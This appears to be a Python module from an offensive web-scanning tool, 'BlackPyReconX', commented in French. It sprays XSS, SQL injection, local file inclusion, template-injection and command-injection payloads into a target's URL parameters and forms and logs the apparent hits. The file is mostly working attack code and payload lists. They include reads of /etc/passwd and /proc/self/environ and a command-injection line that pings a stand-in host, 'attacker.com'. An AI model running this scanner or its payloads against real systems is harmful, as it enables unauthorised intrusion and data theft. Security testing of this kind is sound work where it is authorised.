# modules/exploit_web.py

import requests
from bs4 import BeautifulSoup
import urllib.parse
import os
import time

OUTPUT_FILE = "outputs/web_vulns.txt"
HEADERS = {"User-Agent": "Mozilla/5.0 (compatible; BlackPyReconX/2.0)"}
TIMEOUT = 6

# Payloads puissants et critiques
XSS_PAYLOADS = [
    "<script>alert(1337)</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>"
]

SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "' OR sleep(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "' OR '1'='1'#"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../../../etc/passwd%00",
    "..%2f..%2fetc%2fpasswd",
    "/proc/self/environ",
    "../../../../windows/win.ini"
]

SSTI_PAYLOADS = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
RCE_PAYLOADS = [";id", "|whoami", "`id`", "& ping -c 3 attacker.com"]

SQL_ERRORS = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "sqlite error", "syntax error", "sqlstate"
]

found_vulns = []

def save_output(data):
    os.makedirs("outputs", exist_ok=True)
    with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
        f.write(data + "\n")
    found_vulns.append(data)

def is_time_delay(url, delay=4):
    try:
        start = time.time()
        requests.get(url, headers=HEADERS, timeout=10)
        duration = time.time() - start
        return duration > delay
    except:
        return False

def test_url_params(url):
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)

    for param in qs:
        for payload in SQLI_PAYLOADS + XSS_PAYLOADS + LFI_PAYLOADS:
            new_qs = qs.copy()
            new_qs[param] = payload
            new_url = parsed._replace(query=urllib.parse.urlencode(new_qs, doseq=True)).geturl()
            try:
                r = requests.get(new_url, headers=HEADERS, timeout=TIMEOUT)
                body = r.text.lower()
                if any(err in body for err in SQL_ERRORS):
                    save_output(f"[SQLi] Possible SQLi sur `{param}` à : {new_url}")
                if XSS_PAYLOADS[0] in r.text:
                    save_output(f"[XSS] Reflet de script dans `{param}` à : {new_url}")
                if "root:x:" in r.text or "/bin/bash" in r.text:
                    save_output(f"[LFI] Inclusion possible via `{param}` à : {new_url}")
                if is_time_delay(new_url):
                    save_output(f"[Time-Based SQLi] Temps suspect sur `{param}` à : {new_url}")
            except:
                continue

def test_forms(url):
    try:
        r = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action") or url
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            for payload in SQLI_PAYLOADS + XSS_PAYLOADS + LFI_PAYLOADS + SSTI_PAYLOADS + RCE_PAYLOADS:
                data = {}
                for i in inputs:
                    name = i.get("name")
                    if name:
                        data[name] = payload

                target_url = urllib.parse.urljoin(url, action)
                try:
                    if method == "post":
                        res = requests.post(target_url, data=data, headers=HEADERS, timeout=TIMEOUT)
                    else:
                        res = requests.get(target_url, params=data, headers=HEADERS, timeout=TIMEOUT)

                    body = res.text.lower()
                    if any(err in body for err in SQL_ERRORS):
                        save_output(f"[SQLi-Form] Injection SQL possible sur `{target_url}` avec `{payload}`")
                    if XSS_PAYLOADS[0] in res.text:
                        save_output(f"[XSS-Form] Script détecté dans la réponse de `{target_url}`")
                    if "root:x:" in body:
                        save_output(f"[LFI-Form] Contenu sensible inclus dans `{target_url}`")
                    if "49" in res.text or "{{49}}" in res.text:
                        save_output(f"[SSTI] SSTI possible sur `{target_url}` avec `{payload}`")
                    if "uid=" in body or "gid=" in body:
                        save_output(f"[RCE] Commande exécutée sur `{target_url}` avec `{payload}`")
                except:
                    continue
    except Exception as e:
        save_output(f"[FormScan] Erreur générale : {e}")

def run(target, options=None):
    save_output(f"\n--- Analyse Web Avancée sur {target} ---")
    urls = [f"http://{target}", f"https://{target}"]
    for url in urls:
        save_output(f"[Analyse] Lancement sur : {url}")
        test_url_params(url + "?q=test&id=1")
        test_forms(url)
    save_output("--- Fin analyse Web ---\n")


